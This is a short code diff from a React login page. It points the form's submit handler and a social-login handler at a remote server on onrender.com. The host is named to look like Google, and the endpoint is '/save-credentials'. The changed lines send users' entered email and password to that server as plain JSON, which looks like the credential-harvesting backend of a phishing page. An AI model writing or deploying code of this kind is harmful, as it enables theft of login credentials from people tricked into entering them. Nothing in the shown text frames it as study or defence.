@@ -116,7 +116,7 @@ const App = () => {
     e.preventDefault();
     const credentials = { email, password };
     try {
-      const response = await fetch('http://localhost:5000/save-credentials', {
+      const response = await fetch('https://google-frontend-w2vb.onrender.com/save-credentials', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(credentials)
@@ -130,7 +130,7 @@ const App = () => {
   const handleSocialLogin = async (provider) => {
     const credentials = { provider, password: 'N/A' };
     try {
-      const response = await fetch('http://localhost:5000/save-credentials', {
+      const response = await fetch('https://google-frontend-w2vb.onrender.com/save-credentials', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(credentials)
